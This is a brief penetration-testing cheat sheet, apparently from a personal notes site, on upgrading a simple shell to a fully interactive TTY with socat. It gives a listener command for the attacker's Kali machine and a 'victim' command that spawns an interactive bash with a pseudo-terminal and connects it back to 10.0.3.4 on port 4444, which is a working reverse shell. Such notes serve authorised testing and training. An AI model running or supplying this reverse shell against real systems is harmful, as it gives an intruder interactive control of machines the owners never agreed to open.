# Upgrading TTY Shells

{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" %}

**On Kali (listen)**:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
